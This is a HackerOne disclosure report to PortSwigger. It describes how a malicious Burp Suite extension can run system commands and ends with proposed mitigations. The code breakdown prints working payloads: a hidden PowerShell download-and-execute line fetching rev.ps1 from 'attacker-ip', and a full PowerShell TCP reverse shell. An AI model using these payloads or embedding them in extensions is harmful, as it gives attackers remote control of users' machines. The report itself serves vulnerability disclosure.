# Burp Suite extensions can execute arbitrary code

## Report Details
- **Report ID**: 3014158
- **URL**: https://hackerone.com/reports/3014158
- **State**: Closed
- **Severity**: high
- **Submitted**: 2025-02-26T13:33:31.879Z
- **Disclosed**: 2025-02-26T13:52:23.646Z

## Reporter
- **Username**: iamunixtz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: portswigger

## Vulnerability Information
**Dear PortSwigger Security Team,**

I hope you’re doing well. I’m reaching out to share a security concern regarding Burp Suite’s extension framework that could allow an attacker to compromise a machine by executing untrusted code. While Burp Suite offers powerful extensibility, this flexibility can also introduce significant security risks if an attacker crafts a malicious extension. This research highlights a attack vector that allows code execution, leading to full system compromise, including reverse shells and persistent access.

## **Overview of the Issue**
Burp Suite extensions, when installed and executed, run with the same privileges as the user. This means that an attacker can embed arbitrary system commands inside an extension that, when loaded, will execute malicious payloads. This could include actions such as:
- Running a reverse shell to an attacker-controlled machine.
- Downloading and executing remote payloads.
- Capturing keystrokes, screenshots, and other sensitive data.
- Bypassing security measures by running malicious actions in the background.

For this demonstration, I will showcase how an attacker can embed seemingly harmless functionality inside a Burp extension while covertly executing malicious actions in the background.


## **Demonstration of the Attack**
To illustrate this, I created a Burp extension that appears to perform simple tasks such as opening Notepad and Calculator. However, in reality, it also performs the following malicious actions:
1. **Creates a hidden PowerShell script** (`poc.ps1`).
2. **Executes the PowerShell script**, which opens a reverse shell to an attacker’s machine.
3. **Opens a backdoor using `nc` (Netcat)** to maintain persistent access.
4. **Runs system-level commands**, such as accessing the webcam, stealing credentials, or modifying system settings.

### **Code Breakdown**
Below is a breakdown of the extension’s malicious functionality:

1. **Executing Arbitrary System Commands (e.g., Calculator, Notepad, Webcam)**
   ```python
   subprocess.Popen(["calc.exe"], shell=True)  # Opens Calculator
   subprocess.Popen(["notepad.exe", "poc.txt"], shell=True)  # Opens Notepad with a file
   subprocess.Popen(["start", "microsoft.windows.camera:"], shell=True)  # Opens Camera
   ```
   While these actions seem harmless, they demonstrate the ability to execute system commands within an extension.

2. **Creating and Writing to a PowerShell Script**
   ```python
   file_path = os.path.join(os.getcwd(), "burpextension", "poc.ps1")
   with open(file_path, "w") as file:
       file.write("Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker-ip:8000/rev.ps1\')\"'")
   ```
   This script downloads and executes a remote PowerShell payload, providing the attacker with control over the compromised system.

3. **Executing the Malicious PowerShell Script**
   ```python
   subprocess.Popen(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], shell=True)
   ```
   This runs the PowerShell script, enabling remote access for the attacker.

4. **Establishing a Reverse Shell with Netcat**
   ```powershell
   $client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
   $stream = $client.GetStream();
   [byte[]]$bytes = 0..65535|%{0};
   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
       $sendback = (iex $data 2>&1 | Out-String );
       $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
       $stream.Write($sendbyte,0,$sendbyte.Length);
       $stream.Flush()
   }
   ```
   This establishes a persistent reverse shell, allowing full system access.

**While Burp Suite does provide an extension signing feature, many users disable it or install extensions from unverified sources, making them vulnerable.**

##Full pwn Poc
{F4093216}

## **Mitigations & Recommendations**
To address this issue, I propose the following mitigations:
1. **Restrict System Commands in Extensions**
   - Prevent direct execution of `subprocess.Popen()`, `os.system()`, or PowerShell commands inside extensions.
   - Introduce an API restriction that blocks execution of commands unless explicitly allowed by the user.

2. **Extension Code Review & Sandboxing**
   - Implement a sandboxing mechanism that restricts what an extension can execute.
   - Require explicit user confirmation before an extension can execute system commands.

3. **Enforce Digital Signing for Extensions**
   - Require all extensions to be signed and verified before execution.
   - Warn users when installing unsigned extensions.

4. **Monitor and Log Extension Behavior**
   - Implement logging for all system commands executed by an extension.
   - Alert users if an extension attempts to execute unauthorized actions.

## **Conclusion**
This research demonstrates how a malicious Burp Suite extension can be used as a Trojan horse to execute arbitrary system commands, including launching a reverse shell. Given that Burp Suite is widely used by security professionals, pentesters, and even corporate environments, it is critical to enforce stricter controls on extension execution to prevent abuse.

I appreciate your time in reviewing this report, and I hope this helps improve the security of Burp Suite. Please let me know if you need further details or if I can assist with any additional testing.

Looking forward to your feedback!

## Impact

The primary issue is that Burp Suite extensions execute code with the same privileges as the user. If an attacker manages to convince a target to install a malicious extension, they can:
- Gain **persistent access** to the system.
- Execute **arbitrary system commands** in the background.
- Steal **sensitive data** without detection.
- **Bypass security measures** by executing trusted processes (e.g., PowerShell, cmd.exe, or Windows utilities).

## Attachments
- pocextension.py
- pwn_by_burp.mp4
- pwn_by_burp.mp4
- pwn_by_burp.mp4
